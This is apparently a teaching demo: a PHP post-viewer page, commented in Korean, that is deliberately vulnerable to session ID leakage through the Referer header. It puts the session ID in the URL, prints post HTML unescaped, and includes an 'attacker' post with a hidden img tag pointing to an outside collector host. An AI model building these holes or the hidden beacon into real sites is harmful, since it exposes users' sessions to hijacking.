<?php
// Referrer-Policy 설정이 없음 → Referer 헤더 유출 허용
$sessionId = $_GET['sessionid'] ?? 'NO_SESSION';
$postId = $_GET['id'] ?? '1';

// 게시글 데이터 (공격자가 작성한 글 포함)
$posts = [
    '1' => '<h2>정상적인 글입니다</h2><p>안녕하세요!</p>',
    '5' => '<h2>공격자 글</h2><p>쿠폰 드림! <img src="http://3-1/3-1-1.php" style="display:none"></p>'
];
?>
<!DOCTYPE html>
<html>
<head>
    <title>게시글 보기</title>
</head>
<body>
    <h1>세션 ID: <?= htmlspecialchars($sessionId) ?></h1>

    <div class="post">
        <?= $posts[$postId] ?? '글이 존재하지 않습니다.' ?>
    </div>
</body>
</html>